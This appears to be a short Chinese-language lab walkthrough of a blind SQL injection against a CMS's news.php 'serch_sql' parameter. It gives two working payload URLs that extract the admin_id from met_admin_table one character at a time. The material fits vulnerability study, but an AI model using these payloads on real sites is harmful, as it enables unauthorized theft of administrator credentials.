
# 实战
在浏览器输入
```
http://IP:PORT/install/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)

![image]({path}/3.png)

![image]({path}/4.png)



## 攻击实战

我们去猜测admin表，如果admin表里面的admin_id的第一个字母为a的话，那么页面里面有值,这样一来 比sql注入更为简单了97那个位置，然后在判断第二位，再穷聚 自然就爆表了.


在浏览器输入
```
http://192.168.1.170:7777/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1-- sd&imgproduct=xxxx 
```

![image]({path}/5.png)

```
http://192.168.1.170:7777/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=96,1,0) limit 0,1-- sd&imgproduct=xxxx 
```
![image]({path}/6.png)



